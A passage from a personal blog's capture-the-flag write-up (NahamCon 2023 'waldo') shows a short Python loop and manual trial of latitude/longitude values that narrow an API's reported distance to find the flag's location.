    <span class="n">data</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
    <span class="n">off_by</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;off_by&#34;</span><span class="p">)</span>
    <span class="n">i</span> <span class="o">=</span> <span class="n">off_by</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
    <span class="k">return</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>



<span class="k">def</span> <span class="nf">move</span><span class="p">():</span>
    <span class="n">pos</span><span class="o">=</span><span class="nb">list</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="o">-</span><span class="mi">180</span><span class="p">,</span><span class="mi">180</span><span class="p">,</span><span class="mi">30</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">30</span><span class="p">,</span><span class="mi">2</span><span class="p">):</span>
            <span class="n">dis</span><span class="o">=</span><span class="n">calculate_distance</span><span class="p">(</span><span class="n">y</span><span class="p">,</span><span class="n">x</span><span class="p">)</span>
            <span class="n">pos</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">list</span><span class="p">)</span>

    <span class="nb">print</span><span class="p">(</span><span class="n">pos</span><span class="p">)</span>



<span class="n">move</span><span class="p">()</span>

</code></pre></td></tr></table>
</div>
</div><p>The code above  i used to be able to narrow down on which coordinated produces the least distance from waldo</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">
<span class="nv">lat</span><span class="o">=</span>30<span class="p">&amp;</span><span class="nv">long</span><span class="o">=</span>-60 low 1099.613580066382

this was the lowest

</code></pre></td></tr></table>
</div>
</div><p>from here i entered the values manually by trying  raising the value higher or lower and chacking the changes in the distance</p>
<p>at   lat=40.60 and long -74.67 we needed to go even smaller units so i researched and found out that api use the following format to show distance</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">Latitude: Â±DD.DDDDDD
Longitude: Â±DDD.DDDDDD

where D is any number between 1-9

</code></pre></td></tr></table>
</div>
</div><p>final position lat=40.583333 and long=-74.67</p>
<p><img src="/images/nahamcon2023/waldo_flag.png"
	
	
	
	loading="lazy"
	
		alt="waldo_flag"
	
	
></p>

</section>


    <footer class="article-footer">
    

    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">Related content</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/p/hack_the_boo2023/">
        
        
            <div class="article-image">
                
                    <img src="/cover/hackthebox.jpeg" loading="lazy" data-key="" data-hash="/cover/hackthebox.jpeg"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">Hack_the_boo2023</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/blackhat_mea_2023/">
        
        
            <div class="article-image">
                
                    <img src="/cover/blackhat.png" loading="lazy" data-key="" data-hash="/cover/blackhat.png"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">Blackhat_mea_2023</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/shehacks_intrervasity_2023/">
        
        
            <div class="article-image">
                
                    <img src="/cover/shctf.jpg" loading="lazy" data-key="" data-hash="/cover/shctf.jpg"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">Shehacks_intrervasity_2023</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/imaginaryctf2023/">
        
        
            <div class="article-image">
                
                    <img src="/cover/ictf_banner.png" loading="lazy" data-key="" data-hash="/cover/ictf_banner.png"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">ImaginaryCTF2023</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/bic-winter-con-2023/">
        
        

        <div class="article-details">
            <h2 class="article-title">Bic winter con 2023</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <script
    src="https://giscus.app/client.js"
    data-repo="f0rk3b0mb/f0rk3b0mb.github.io"
    data-repo-id=""
    data-category=""
    data-category-id=""
    data-mapping="title"
    data-strict="0"
    data-reactions-enabled="1"
    data-emit-metadata="0"
    data-input-position="top"
    data-theme="light"
    data-lang="en"
    crossorigin="anonymous"
    async
></script>
<script>
    function setGiscusTheme(theme) {
        let giscus = document.querySelector("iframe.giscus-frame");
        if (giscus) {
            giscus.contentWindow.postMessage(
                {
                    giscus: {
                        setConfig: {
                            theme: theme,
                        },
                    },
                },
                "https://giscus.app"
            );
        }
    }

    (function () {
        addEventListener("message", (e) => {
            if (event.origin !== "https://giscus.app") return;
            handler();
        });
        window.addEventListener("onColorSchemeChange", handler);

        function handler() {
            if (document.documentElement.dataset.scheme === "light") {
                setGiscusTheme('light');
            } else {
                setGiscusTheme('dark_dimmed');
            }
        }
    })();
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2023 f0rk3b0mb
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.16.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
